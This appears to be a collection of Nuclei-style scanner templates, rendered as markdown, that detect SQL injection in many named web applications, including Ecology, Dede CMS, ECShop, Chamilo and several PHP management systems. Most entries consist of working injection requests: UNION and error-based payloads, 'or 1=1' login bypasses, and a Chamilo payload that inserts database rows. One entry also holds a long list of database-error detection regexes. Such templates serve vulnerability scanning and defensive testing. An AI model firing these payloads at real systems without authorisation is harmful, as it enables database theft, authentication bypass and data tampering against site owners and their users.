# Ecology 8 - SQL Injection
## Description
- Ecology 8 contains a SQL injection vulnerability via a GET request. An attacker can possibly obtain sensitive information from a database, modify data, and execute unauthorized administrative operations in the context of the affected site.
- severity - critical
- tags - ecology,sqli
## Requests
- Method - GET
### URL
- {{BaseURL}}/js/hrm/getdata.jsp?cmd=getSelectAllId&sql=select+547653*865674+as+id
### Matchers

**Type - word**
- part - body
- words
    1. 474088963122

**Type - status**
- status
    1. 200

---
# Ecology Syncuserinfo - SQL Injection
## Description
- Ecology Syncuserinfo contains a SQL injection vulnerability via a GET request. An attacker can possibly obtain sensitive information from a database, modify data, and execute unauthorized administrative operations in the context of the affected site.
- severity - critical
- tags - ecology,sqli
## Requests
- Method - GET
### URL
- {{BaseURL}}/mobile/plugin/SyncUserInfo.jsp?userIdentifiers=-1)union(select(3),null,null,null,null,null,str(98989*44313),null
### Matchers

**Type - word**
- part - body
- words
    1. 4386499557

**Type - status**
- status
    1. 200

---
# Dede CMS - SQL Injection
## Description
- Dede CMS contains a SQL injection vulnerability which allows remote unauthenticated users to inject arbitrary SQL statements via the ajax_membergroup.php endpoint and the membergroup parameter.
- severity - critical
- tags - sqli,dedecms
## Requests
- Method - GET
### URL
- {{BaseURL}}/member/ajax_membergroup.php?action=post&membergroup=@`'`/*!50000Union+*/+/*!50000select+*/+md5({{num}})+--+@`'`
### Matchers

**Type - word**
- words
    1. {{md5({{num}})}}
- part - body

**Type - status**
- status
    1. 200

---
# Simple CRM 3.0 SQL Injection and Authentication Bypass
## Description
- Simple CRM 3.0 is susceptible to SQL injection and authentication bypass vulnerabilities.
- severity - critical
- tags - packetstorm,sqli,simplecrm,auth-bypass,injection
## Requests
- Method - POST
- Method - POST
### URL
- {{BaseURL}}/scrm/crm/admin
  - email='+or+2>1+--+&password=&login=
### Matchers

**Type - status**
- status
    1. 200

**Type - word**
- words
    1. <script>window.location.href='home.php'</script>
- part - body

**Type - word**
- words
    1. text/html
- part - header

---
# Error based SQL injection
## Description
- Detects the possibility of SQL injection in 29 database engines. Inspired by https://github.com/sqlmapproject/sqlmap/blob/master/data/xml/errors.xml.
- severity - high
- tags - sqli,generic,error
## Requests
- Method - GET
### URL
- {{BaseURL}}/'
### Matchers

**Type - word**
- words
    1. Adminer
- part - body
- negative - True

**Type - regex**
- regex
    1. SQL syntax.*?MySQL
    2. Warning.*?\Wmysqli?_
    3. MySQLSyntaxErrorException
    4. valid MySQL result
    5. check the manual that (corresponds to|fits) your MySQL server version
    6. Unknown column '[^ ]+' in 'field list'
    7. MySqlClient\.
    8. com\.mysql\.jdbc
    9. Zend_Db_(Adapter|Statement)_Mysqli_Exception
    10. Pdo[./_\\]Mysql
    11. MySqlException
    12. SQLSTATE\[\d+\]: Syntax error or access violation
    13. check the manual that (corresponds to|fits) your MariaDB server version
    14. check the manual that (corresponds to|fits) your Drizzle server version
    15. MemSQL does not support this type of query
    16. is not supported by MemSQL
    17. unsupported nested scalar subselect
    18. PostgreSQL.*?ERROR
    19. Warning.*?\Wpg_
    20. valid PostgreSQL result
    21. Npgsql\.
    22. PG::SyntaxError:
    23. org\.postgresql\.util\.PSQLException
    24. ERROR:\s\ssyntax error at or near
    25. ERROR: parser: parse error at or near
    26. PostgreSQL query failed
    27. org\.postgresql\.jdbc
    28. Pdo[./_\\]Pgsql
    29. PSQLException
    30. Driver.*? SQL[\-\_\ ]*Server
    31. OLE DB.*? SQL Server
    32. \bSQL Server[^&lt;&quot;]+Driver
    33. Warning.*?\W(mssql|sqlsrv)_
    34. \bSQL Server[^&lt;&quot;]+[0-9a-fA-F]{8}
    35. System\.Data\.SqlClient\.SqlException\.(SqlException|SqlConnection\.OnError)
    36. (?s)Exception.*?\bRoadhouse\.Cms\.
    37. Microsoft SQL Native Client error '[0-9a-fA-F]{8}
    38. \[SQL Server\]
    39. ODBC SQL Server Driver
    40. ODBC Driver \d+ for SQL Server
    41. SQLServer JDBC Driver
    42. com\.jnetdirect\.jsql
    43. macromedia\.jdbc\.sqlserver
    44. Zend_Db_(Adapter|Statement)_Sqlsrv_Exception
    45. com\.microsoft\.sqlserver\.jdbc
    46. Pdo[./_\\](Mssql|SqlSrv)
    47. SQL(Srv|Server)Exception
    48. Unclosed quotation mark after the character string
    49. Microsoft Access (\d+ )?Driver
    50. JET Database Engine
    51. Access Database Engine
    52. ODBC Microsoft Access
    53. Syntax error \(missing operator\) in query expression
    54. \bORA-\d{5}
    55. Oracle error
    56. Oracle.*?Driver
    57. Warning.*?\W(oci|ora)_
    58. quoted string not properly terminated
    59. SQL command not properly ended
    60. macromedia\.jdbc\.oracle
    61. oracle\.jdbc
    62. Zend_Db_(Adapter|Statement)_Oracle_Exception
    63. Pdo[./_\\](Oracle|OCI)
    64. OracleException
    65. CLI Driver.*?DB2
    66. DB2 SQL error
    67. \bdb2_\w+\(
    68. SQLCODE[=:\d, -]+SQLSTATE
    69. com\.ibm\.db2\.jcc
    70. Zend_Db_(Adapter|Statement)_Db2_Exception
    71. Pdo[./_\\]Ibm
    72. DB2Exception
    73. ibm_db_dbi\.ProgrammingError
    74. Warning.*?\Wifx_
    75. Exception.*?Informix
    76. Informix ODBC Driver
    77. ODBC Informix driver
    78. com\.informix\.jdbc
    79. weblogic\.jdbc\.informix
    80. Pdo[./_\\]Informix
    81. IfxException
    82. Dynamic SQL Error
    83. Warning.*?\Wibase_
    84. org\.firebirdsql\.jdbc
    85. Pdo[./_\\]Firebird
    86. SQLite/JDBCDriver
    87. SQLite\.Exception
    88. (Microsoft|System)\.Data\.SQLite\.SQLiteException
    89. Warning.*?\W(sqlite_|SQLite3::)
    90. \[SQLITE_ERROR\]
    91. SQLite error \d+:
    92. sqlite3.OperationalError:
    93. SQLite3::SQLException
    94. org\.sqlite\.JDBC
    95. Pdo[./_\\]Sqlite
    96. SQLiteException
    97. SQL error.*?POS([0-9]+)
    98. Warning.*?\Wmaxdb_
    99. DriverSapDB
    100. -3014.*?Invalid end of SQL statement
    101. com\.sap\.dbtech\.jdbc
    102. \[-3008\].*?: Invalid keyword or missing delimiter
    103. Warning.*?\Wsybase_
    104. Sybase message
    105. Sybase.*?Server message
    106. SybSQLException
    107. Sybase\.Data\.AseClient
    108. com\.sybase\.jdbc
    109. Warning.*?\Wingres_
    110. Ingres SQLSTATE
    111. Ingres\W.*?Driver
    112. com\.ingres\.gcf\.jdbc
    113. Exception (condition )?\d+\. Transaction rollback
    114. com\.frontbase\.jdbc
    115. Syntax error 1. Missing
    116. (Semantic|Syntax) error [1-4]\d{2}\.
    117. Unexpected end of command in statement \[
    118. Unexpected token.*?in statement \[
    119. org\.hsqldb\.jdbc
    120. org\.h2\.jdbc
    121. \[42000-192\]
    122. ![0-9]{5}![^\n]+(failed|unexpected|error|syntax|expected|violation|exception)
    123. \[MonetDB\]\[ODBC Driver
    124. nl\.cwi\.monetdb\.jdbc
    125. Syntax error: Encountered
    126. org\.apache\.derby
    127. ERROR 42X01
    128. , Sqlstate: (3F|42).{3}, (Routine|Hint|Position):
    129. /vertica/Parser/scan
    130. com\.vertica\.jdbc
    131. org\.jkiss\.dbeaver\.ext\.vertica
    132. com\.vertica\.dsi\.dataengine
    133. com\.mckoi\.JDBCDriver
    134. com\.mckoi\.database\.jdbc
    135. &lt;REGEX_LITERAL&gt;
    136. com\.facebook\.presto\.jdbc
    137. io\.prestosql\.jdbc
    138. com\.simba\.presto\.jdbc
    139. UNION query has different number of fields: \d+, \d+
    140. Altibase\.jdbc\.driver
    141. com\.mimer\.jdbc
    142. Syntax error,[^\n]+assumed to mean
    143. io\.crate\.client\.jdbc
    144. encountered after end of query
    145. A comparison operator is required here
    146. -10048: Syntax error
    147. rdmStmtPrepare\(.+?\) returned
    148. SQ074: Line \d+:
    149. SR185: Undefined procedure
    150. SQ200: No table 
    151. Virtuoso S0002 Error
    152. \[(Virtuoso Driver|Virtuoso iODBC Driver)\]\[Virtuoso Server\]
- condition - or
### Extractors

**Type - regex**
- name - MySQL
- regex
    1. SQL syntax.*?MySQL
    2. Warning.*?\Wmysqli?_
    3. MySQLSyntaxErrorException
    4. valid MySQL result
    5. check the manual that (corresponds to|fits) your MySQL server version
    6. Unknown column '[^ ]+' in 'field list'
    7. MySqlClient\.
    8. com\.mysql\.jdbc
    9. Zend_Db_(Adapter|Statement)_Mysqli_Exception
    10. Pdo[./_\\]Mysql
    11. MySqlException
    12. SQLSTATE[\d+]: Syntax error or access violation

**Type - regex**
- name - MariaDB
- regex
    1. check the manual that (corresponds to|fits) your MariaDB server version

**Type - regex**
- name - Drizzel
- regex
    1. check the manual that (corresponds to|fits) your Drizzle server version

**Type - regex**
- name - MemSQL
- regex
    1. MemSQL does not support this type of query
    2. is not supported by MemSQL
    3. unsupported nested scalar subselect

**Type - regex**
- name - PostgreSQL
- regex
    1. PostgreSQL.*?ERROR
    2. Warning.*?\Wpg_
    3. valid PostgreSQL result
    4. Npgsql\.
    5. PG::SyntaxError:
    6. org\.postgresql\.util\.PSQLException
    7. ERROR:\s\ssyntax error at or near
    8. ERROR: parser: parse error at or near
    9. PostgreSQL query failed
    10. org\.postgresql\.jdbc
    11. Pdo[./_\\]Pgsql
    12. PSQLException

**Type - regex**
- name - MicrosoftSQLServer
- regex
    1. Driver.*? SQL[\-\_\ ]*Server
    2. OLE DB.*? SQL Server
    3. \bSQL Server[^&lt;&quot;]+Driver
    4. Warning.*?\W(mssql|sqlsrv)_
    5. \bSQL Server[^&lt;&quot;]+[0-9a-fA-F]{8}
    6. System\.Data\.SqlClient\.SqlException\.(SqlException|SqlConnection\.OnError)
    7. (?s)Exception.*?\bRoadhouse\.Cms\.
    8. Microsoft SQL Native Client error '[0-9a-fA-F]{8}
    9. \[SQL Server\]
    10. ODBC SQL Server Driver
    11. ODBC Driver \d+ for SQL Server
    12. SQLServer JDBC Driver
    13. com\.jnetdirect\.jsql
    14. macromedia\.jdbc\.sqlserver
    15. Zend_Db_(Adapter|Statement)_Sqlsrv_Exception
    16. com\.microsoft\.sqlserver\.jdbc
    17. Pdo[./_\\](Mssql|SqlSrv)
    18. SQL(Srv|Server)Exception
    19. Unclosed quotation mark after the character string

**Type - regex**
- name - MicrosoftAccess
- regex
    1. Microsoft Access (\d+ )?Driver
    2. JET Database Engine
    3. Access Database Engine
    4. ODBC Microsoft Access
    5. Syntax error \(missing operator\) in query expression

**Type - regex**
- name - Oracle
- regex
    1. \bORA-\d{5}
    2. Oracle error
    3. Oracle.*?Driver
    4. Warning.*?\W(oci|ora)_
    5. quoted string not properly terminated
    6. SQL command not properly ended
    7. macromedia\.jdbc\.oracle
    8. oracle\.jdbc
    9. Zend_Db_(Adapter|Statement)_Oracle_Exception
    10. Pdo[./_\\](Oracle|OCI)
    11. OracleException

**Type - regex**
- name - IBMDB2
- regex
    1. CLI Driver.*?DB2
    2. DB2 SQL error
    3. \bdb2_\w+\(
    4. SQLCODE[=:\d, -]+SQLSTATE
    5. com\.ibm\.db2\.jcc
    6. Zend_Db_(Adapter|Statement)_Db2_Exception
    7. Pdo[./_\\]Ibm
    8. DB2Exception
    9. ibm_db_dbi\.ProgrammingError

**Type - regex**
- name - Informix
- regex
    1. Warning.*?\Wifx_
    2. Exception.*?Informix
    3. Informix ODBC Driver
    4. ODBC Informix driver
    5. com\.informix\.jdbc
    6. weblogic\.jdbc\.informix
    7. Pdo[./_\\]Informix
    8. IfxException

**Type - regex**
- name - Firebird
- regex
    1. Dynamic SQL Error
    2. Warning.*?\Wibase_
    3. org\.firebirdsql\.jdbc
    4. Pdo[./_\\]Firebird

**Type - regex**
- name - SQLite
- regex
    1. SQLite/JDBCDriver
    2. SQLite\.Exception
    3. (Microsoft|System)\.Data\.SQLite\.SQLiteException
    4. Warning.*?\W(sqlite_|SQLite3::)
    5. \[SQLITE_ERROR\]
    6. SQLite error \d+:
    7. sqlite3.OperationalError:
    8. SQLite3::SQLException
    9. org\.sqlite\.JDBC
    10. Pdo[./_\\]Sqlite
    11. SQLiteException

**Type - regex**
- name - SAPMaxDB
- regex
    1. SQL error.*?POS([0-9]+)
    2. Warning.*?\Wmaxdb_
    3. DriverSapDB
    4. -3014.*?Invalid end of SQL statement
    5. com\.sap\.dbtech\.jdbc
    6. \[-3008\].*?: Invalid keyword or missing delimiter

**Type - regex**
- name - Sybase
- regex
    1. Warning.*?\Wsybase_
    2. Sybase message
    3. Sybase.*?Server message
    4. SybSQLException
    5. Sybase\.Data\.AseClient
    6. com\.sybase\.jdbc

**Type - regex**
- name - Ingres
- regex
    1. Warning.*?\Wingres_
    2. Ingres SQLSTATE
    3. Ingres\W.*?Driver
    4. com\.ingres\.gcf\.jdbc

**Type - regex**
- name - FrontBase
- regex
    1. Exception (condition )?\d+\. Transaction rollback
    2. com\.frontbase\.jdbc
    3. Syntax error 1. Missing
    4. (Semantic|Syntax) error \[1-4\]\d{2}\.

**Type - regex**
- name - HSQLDB
- regex
    1. Unexpected end of command in statement \[
    2. Unexpected token.*?in statement \[
    3. org\.hsqldb\.jdbc

**Type - regex**
- name - H2
- regex
    1. org\.h2\.jdbc
    2. \[42000-192\]

**Type - regex**
- name - MonetDB
- regex
    1. ![0-9]{5}![^\n]+(failed|unexpected|error|syntax|expected|violation|exception)
    2. \[MonetDB\]\[ODBC Driver
    3. nl\.cwi\.monetdb\.jdbc

**Type - regex**
- name - ApacheDerby
- regex
    1. Syntax error: Encountered
    2. org\.apache\.derby
    3. ERROR 42X01

**Type - regex**
- name - Vertica
- regex
    1. , Sqlstate: (3F|42).{3}, (Routine|Hint|Position):
    2. /vertica/Parser/scan
    3. com\.vertica\.jdbc
    4. org\.jkiss\.dbeaver\.ext\.vertica
    5. com\.vertica\.dsi\.dataengine

**Type - regex**
- name - Mckoi
- regex
    1. com\.mckoi\.JDBCDriver
    2. com\.mckoi\.database\.jdbc
    3. &lt;REGEX_LITERAL&gt;

**Type - regex**
- name - Presto
- regex
    1. com\.facebook\.presto\.jdbc
    2. io\.prestosql\.jdbc
    3. com\.simba\.presto\.jdbc
    4. UNION query has different number of fields: \d+, \d+

**Type - regex**
- name - Altibase
- regex
    1. Altibase\.jdbc\.driver

**Type - regex**
- name - MimerSQL
- regex
    1. com\.mimer\.jdbc
    2. Syntax error,[^\n]+assumed to mean

**Type - regex**
- name - CrateDB
- regex
    1. io\.crate\.client\.jdbc

**Type - regex**
- name - Cache
- regex
    1. encountered after end of query
    2. A comparison operator is required here

**Type - regex**
- name - RaimaDatabaseManager
- regex
    1. -10048: Syntax error
    2. rdmStmtPrepare\(.+?\) returned

**Type - regex**
- name - Virtuoso
- regex
    1. SQ074: Line \d+:
    2. SR185: Undefined procedure
    3. SQ200: No table 
    4. Virtuoso S0002 Error
    5. \[(Virtuoso Driver|Virtuoso iODBC Driver)\]\[Virtuoso Server\]

---
# Employee Management System 1.0 - SQL Injection
## Description
- Employee Management System 1.0 contains a SQL injection vulnerability via the username parameter.  An attacker can possibly obtain sensitive information from a database, modify data, and execute unauthorized administrative operations in the context of the affected site.

- severity - critical
- tags - ems,sqli,cms,auth-bypass,edb
## Requests
### Step - 1
```
POST /process/aprocess.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

mailuid=admin' or 1=1#&pwd=nuclei&login-submit=Login

```
### Matchers

**Type - word**
- part - body
- words
    1. Admin Panel
    2. Log Out
    3. Employee Management System
- condition - and

**Type - status**
- status
    1. 200

---
# PHPOK - SQL Injection
## Description
- PHPOK contains a SQL injection vulnerability via a GET request. An attacker can possibly obtain sensitive information from a database, modify data, and execute unauthorized administrative operations in the context of the affected site.
- severity - critical
- tags - phpok,sqli
## Requests
- Method - GET
### URL
- {{BaseURL}}/api.php?c=project&f=index&token=1234&id=news&sort=1 and extractvalue(1,concat(0x7e,md5({{num}}))) --+
### Matchers

**Type - word**
- part - body
- words
    1. {{md5({{num}})}}

---
# Loan Management System 1.0 - SQL Injection
## Description
- Loan Management System 1.0 contains a SQL injection vulnerability via the username parameter. An attacker can possibly obtain sensitive information from a database, modify data, and execute unauthorized administrative operations in the context of the affected site.

- severity - critical
- tags - auth-bypass,cms,packetstorm,edb,loancms,sqli
## Requests
### Step - 1
```
POST /ajax.php?action=login HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

username=admin'+or+'1'%3D'1'%23&password=nuclei

```
### Step - 2
```
GET /index.php?page=home HTTP/1.1
Host: {{Hostname}}

```
### Matchers

**Type - word**
- part - body
- words
    1. window.start_load
    2. Welcome back Admin
    3. Loan Management System
- condition - and

**Type - word**
- part - body
- words
    1. login-form
- negative - True

---
# Dotnet CMS -  SQL Injection
## Description
- Dotnet CMS contains a SQL injection vulnerability. An attacker can possibly obtain sensitive information from a database, modify data, and execute unauthorized administrative operations in the context of the affected site.
- severity - critical
- tags - dotnetcms,dotnet,sqli
## Requests
- Method - GET
### URL
- {{BaseURL}}/user/City_ajax.aspx?CityId=33'union%20select%20sys.fn_sqlvarbasetostr(HashBytes('MD5','{{randstr}}')),2--
### Matchers

**Type - word**
- part - body
- words
    1. {{md5("{{randstr}}")}}

**Type - status**
- status
    1. 200

---
# ECShop 2.x/3.x - SQL Injection
## Description
- ECShop 2.x and 3.x contains a SQL injection vulnerability which can allow an attacker to inject arbitrary SQL statements via the referer header field and the dangerous eval function, thus possibly allowing an attacker to obtain sensitive information from a database, modify data, and execute unauthorized administrative operations in the context of the affected site.

- severity - critical
- tags - sqli,php,ecshop
## Requests
### Step - 1
```
GET /user.php?act=login HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded
Referer: 554fcae493e564ee0dc75bdf2ebf94caads|a:2:{s:3:"num";s:72:"0,1 procedure analyse(extractvalue(rand(),concat(0x7e,version())),1)-- -";s:2:"id";i:1;}

```
### Step - 2
```
GET /user.php?act=login HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded
Referer: 554fcae493e564ee0dc75bdf2ebf94caads|a:2:{s:3:"num";s:107:"*/SELECT 1,0x2d312720554e494f4e2f2a,2,4,5,6,7,8,0x7b24617364275d3b706870696e666f0928293b2f2f7d787878,10-- -";s:2:"id";s:11:"-1' UNION/*";}554fcae493e564ee0dc75bdf2ebf94ca

```
### Matchers

**Type - word**
- words
    1. XPATH syntax error:
    2. [error] =>
    3. [0] => Array
    4. MySQL server error report:Array
- condition - and

**Type - word**
- words
    1. PHP Extension
    2. PHP Version
- condition - and

---
# SeaCMS 8.7 - SQL Injection
## Description
- SeaCMS 8.7 contains a SQL injection vulnerability. An attacker can possibly obtain sensitive information from a database, modify data, and execute unauthorized administrative operations in the context of the affected site.
- severity - critical
- tags - seacms,sqli
## Requests
- Method - GET
### URL
- {{BaseURL}}/comment/api/index.php?gid=1&page=2&rlist[]=@`%27`,%20extractvalue(1,%20concat_ws(0x20,%200x5c,(select%20md5({{num}})))),@`%27`
### Matchers

**Type - word**
- part - body
- words
    1. {{md5({{num}})}}

**Type - status**
- status
    1. 200

---
# Duomi CMS - SQL Injection
## Description
- Duomi CMS contains a SQL injection vulnerability. An attacker can possibly obtain sensitive information from a database, modify data, and execute unauthorized administrative operations in the context of the affected site.
- severity - critical
- tags - duomicms,sqli
## Requests
- Method - GET
### URL
- {{BaseURL}}/duomiphp/ajax.php?action=addfav&id=1&uid=1%20and%20extractvalue(1,concat_ws(1,1,md5({{num}})))
### Matchers

**Type - word**
- words
    1. {{md5({{num}})}}

**Type - status**
- status
    1. 200

---
# PbootCMS 2.0.7 - SQL Injection
## Description
- PbootCMS 2.0.7 contains a SQL injection vulnerability via pbootcms.db.  An attacker can possibly obtain sensitive information from a database, modify data, and execute unauthorized administrative operations in the context of the affected site.
- severity - critical
- tags - pbootcms,db,exposure,database,sqlite
## Requests
- Method - GET
### URL
- {{BaseURL}}/data/pbootcms.db
### Matchers

**Type - word**
- part - body
- words
    1. PbootCMS
    2. SQLite format 3
- condition - and

**Type - status**
- status
    1. 200

---
# Alumni Management System 1.0 - SQL Injection
## Description
- Alumni Management System 1.0 contains a SQL injection vulnerability via admin/login in the username parameter. An attacker can possibly obtain sensitive information from a database, modify data, and execute unauthorized administrative operations in the context of the affected site.

- severity - critical
- tags - sqli,auth-bypass,cms,edb,alumni
## Requests
### Step - 1
```
POST /admin/ajax.php?action=login HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

username=admin'+or+'1'%3D'1'%23&password=nuclei

```
### Step - 2
```
GET /admin/index.php?page=home HTTP/1.1
Host: {{Hostname}}

```
### Matchers

**Type - word**
- part - body
- words
    1. Welcome back Admin!
    2. Alumni List
- condition - and

**Type - word**
- part - body
- words
    1. #login-form
- negative - True

**Type - status**
- status
    1. 200

---
# Zoo Management System 1.0 - SQL Injection
## Description
- Zoo Management System 1.0 contains a SQL injection vulnerability via the username parameter on the login page. An attacker can possibly obtain sensitive information from a database, modify data, and execute unauthorized administrative operations in the context of the affected site.

- severity - critical
- tags - edb,packetstorm,zms,sqli,auth-bypass,cms
## Requests
### Step - 1
```
POST /admin/index.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

username=admin%27+or+%271%27%3D%271&password=any&login=

```
### Matchers

**Type - word**
- part - body
- words
    1. ZMS ADMIN
    2. Dashboard
    3. Zoo Management System
- condition - and

**Type - status**
- status
    1. 200

---
# 74cms Sql Injection
## Description
- A SQL injection vulnerability exists in 74cms 5.0.1 AjaxPersonalController.class.php.
- severity - critical
- tags - 74cms,sqli
## Requests
- Method - GET
### URL
- {{BaseURL}}/index.php?m=&c=AjaxPersonal&a=company_focus&company_id[0]=match&company_id[1][0]=test") and extractvalue(1,concat(0x7e,md5({{num}}))) -- a
### Matchers

**Type - word**
- words
    1. {{md5({{num}})}}
- part - body

---
# XdCMS - SQL Injection
## Description
- XdCMS contains a SQL injection vulnerability. An attacker can possibly obtain sensitive information from a database, modify data, and execute unauthorized administrative operations in the context of the affected site.
- severity - critical
- tags - sqli,xdcms
## Requests
- Method - POST
- Method - POST
### URL
- {{BaseURL}}/index.php?m=member&f=login_save
  - username=dd' or extractvalue(0x0a,concat(0x0a,md5({{num}})))#&password=dd&submit=+%B5%C7+%C2%BC+

### Matchers

**Type - word**
- words
    1. Content-Type: text/html
- part - header

**Type - word**
- words
    1. {{md5({{num}})}}
- part - body

**Type - status**
- status
    1. 200

---
# ZCMS - SQL Injection
## Description
- ZCMS contains a SQL injection vulnerability. An attacker can possibly obtain sensitive information from a database, modify data, and execute unauthorized administrative operations in the context of the affected site.
- severity - critical
- tags - zcms,sqli
## Requests
- Method - GET
### URL
- {{BaseURL}}/admin/cms_channel.php?del=123456+AND+(SELECT+1+FROM(SELECT+COUNT(*)%2cCONCAT(0x7e%2cmd5({{num}})%2c0x7e%2cFLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.CHARACTER_SETS+GROUP+BY+x)a)--%2b'
### Matchers

**Type - word**
- words
    1. {{md5({{num}})}}
- part - body

**Type - status**
- status
    1. 200

---
# KevinLAB BEMS 1.0 - SQL Injection
## Description
- KevinLAB BEMS 1.0 contains a SQL injection vulnerability. Input passed through input_id POST parameter in /http/index.php is not properly sanitized before being returned to the user or used in SQL queries. An attacker can possibly obtain sensitive information from a database, modify data, and execute unauthorized administrative operations in the context of the affected site.
- severity - critical
- tags - kevinlab,sqli,edb,packetstorm
## Requests
### Step - 1
```
POST /http/index.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Accept-Encoding: gzip, deflate

requester=login&request=login&params=[{"name":"input_id","value":"USERNAME' AND EXTRACTVALUE(1337,CONCAT(0x5C,0x5A534C,(SELECT (ELT(1337=1337,1))),0x5A534C)) AND 'joxy'='joxy"},{"name":"input_passwd","value":"PASSWORD"},{"name":"device_id","value":"xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx"},{"name":"checked","value":false},{"name":"login_key","value":""}]

```
### Matchers

**Type - word**
- words
    1. XPATH syntax error
    2. : '\ZSL1ZSL'
- condition - and

**Type - status**
- status
    1. 200

---
# Aero CMS v0.0.1 - SQL Injection
## Description
- The `author` parameter from the AeroCMS-v0.0.1 CMS system appears to be vulnerable to SQL injection attacks.The malicious user can dump-steal the database, from this CMS system and he can use it for very malicious purposes.

- severity - high
- tags - aero,cms,sqli,edb
## Requests
- Method - GET
### URL
- {{BaseURL}}/author_posts.php?author=admin%27%20UNION%20ALL%20SELECT%20NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(md5({{num}}),1,1),NULL,NULL,NULL,NULL--%20-&p_id=1
- {{BaseURL}}/cms/author_posts.php?author=admin%27%20UNION%20ALL%20SELECT%20NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(md5({{num}}),1,1),NULL,NULL,NULL,NULL--%20-&p_id=1
### Matchers

**Type - word**
- part - body
- words
    1. {{md5(num)}}

**Type - status**
- status
    1. 200

---
# YesWiki <2022-07-07 - SQL Injection
## Description
- YesWiki before 2022-07-07 contains a SQL injection vulnerability via the id parameter in the AccueiL URL. An attacker can possibly obtain sensitive information from a database, modify data, and execute unauthorized administrative operations in the context of the affected site.

- severity - critical
- tags - yeswiki,sqli,huntr
## Requests
- Method - GET
### URL
- {{BaseURL}}/?PagePrincipale/rss&id=1%27+and+extractvalue(0x0a,concat(0x0a,(select+concat_ws(0x207c20,md5({{num}}),1,user()))))--+-
### Matchers

**Type - word**
- part - body
- words
    1. c8c605999f3d8352d7bb792cf3f

**Type - status**
- status
    1. 200

---
# Company Visitor Management System 1.0 - SQL Injection
## Description
- Company Visitor Management System 1.0 contains a SQL injection vulnerability via the login page in the username parameter. An attacker can possibly obtain sensitive information from a database, modify data, and execute unauthorized administrative operations in the context of the affected site.

- severity - critical
- tags - cvms,sqli,auth-bypass,cms,edb,packetstorm
## Requests
### Step - 1
```
POST /index.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

username=admin%27+or+%271%27%3D%271%27%23&password=nuclei&login=

```
### Matchers

**Type - word**
- part - body
- words
    1. Admin user
    2. Dashboard
    3. CVMS
- condition - and

**Type - status**
- status
    1. 200

---
# Wuzhicms 4.1.0 - SQL Injection
## Description
- Wuzhicms 4.1.0 contains a SQL injection vulnerability via the grouppid parameter of /coreframe/app/member/admin/group.php. An attacker can possibly obtain sensitive information from a database, modify data, and execute unauthorized administrative operations in the context of the affected site.

- severity - critical
- tags - wuzhicms,sqli
## Requests
- Method - GET
### URL
- {{BaseURL}}/api/sms_check.php?param=1%27%20and%20updatexml(1,concat(0x7e,(SELECT%20md5({{num}})),0x7e),1)--%20
### Matchers

**Type - word**
- part - body
- words
    1. c8c605999f3d8352d7bb792cf3fdb25

**Type - status**
- status
    1. 200

---
# Chamilo 1.11.14 - SQL Injection
## Description
- Chamilo 1.1.14 contains a SQL injection vulnerability. An attacker can possibly obtain sensitive information from a database, modify data, and execute unauthorized administrative operations in the context of the affected site.
- severity - critical
- tags - chamilo,sqli
## Requests
### Step - 1
```
POST /main/inc/ajax/extra_field.ajax.php?a=search_options_from_tags HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

type=image&field_id=image&tag=image&from=image&search=image&options=["test'); INSERT INTO extra_field_rel_tag(field_id, tag_id, item_id) VALUES (16, 16, 16); INSERT INTO extra_field_values(field_id, item_id,value) VALUES (16, 16,'{{randstr}}'); INSERT INTO extra_field_options(option_value) VALUES ('{{randstr}}'); INSERT INTO tag (id, tag, field_id,count) VALUES(16, '{{randstr}}', 16,0) ON DUPLICATE KEY UPDATE     tag='{{randstr}}', field_id=16, count=0;  -- "]

```
### Step - 2
```
POST /main/inc/ajax/extra_field.ajax.php?a=search_options_from_tags HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

type=image&field_id=image&tag=image&from=image&search=image&options=["test') or 1=1 -- "]

```
### Matchers

**Type - dsl**
- dsl
    1. contains(body_2, "{{randstr}}")

---
# ECTouch 2 - SQL Injection
## Description
- ECTouch 2 contains a SQL injection vulnerability. An attacker can possibly obtain sensitive information from a database, modify data, and execute unauthorized administrative operations in the context of the affected site.
- severity - critical
- tags - etouch,sqli
## Requests
- Method - GET
### URL
- {{BaseURL}}/upload/mobile/index.php?c=category&a=asynclist&price_max=1.0%20AND%20(SELECT%201%20FROM(SELECT%20COUNT(*),CONCAT(0x7e,md5({{num}}),0x7e,FLOOR(RAND(0)*2))x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x)a)''
### Matchers

**Type - status**
- status
    1. 200

**Type - word**
- words
    1. {{md5({{num}})}}
- part - body

---
# FineCMS 5.0.10 - SQL Injection
## Description
- FineCMS 5.0.10 contains a SQL injection vulnerability. An attacker can possibly obtain sensitive information from a database, modify data, and execute unauthorized administrative operations in the context of the affected site.

- severity - critical
- tags - finecms,sqli
## Requests
- Method - GET
### URL
- {{BaseURL}}/index.php?c=api&m=data2&auth=582f27d140497a9d8f048ca085b111df&param=action=sql%20sql=%27select%20md5({{num}})%27
### Matchers

**Type - word**
- words
    1. {{md5({{num}})}}

---
# Yonyou U8 - SQL Injection
## Description
- Yonyou U8 contains a SQL injection vulnerability. An attacker can possibly obtain sensitive information from a database, modify data, and execute unauthorized administrative operations in the context of the affected site.
- severity - critical
- tags - yonyou,oa,sqli
## Requests
- Method - GET
### URL
- {{BaseURL}}/yyoa/common/js/menu/test.jsp?doType=101&S1=(SELECT%20md5({{num}}))
### Matchers

**Type - word**
- part - body
- words
    1. {{md5({{num}})}}

**Type - status**
- status
    1. 200

---
# ZenTao CMS - SQL Injection
## Description
- ZenTao CMS contains a SQL injection vulnerability. An attacker can possibly obtain sensitive information from a database, modify data, and execute unauthorized administrative operations in the context of the affected site.

- severity - critical
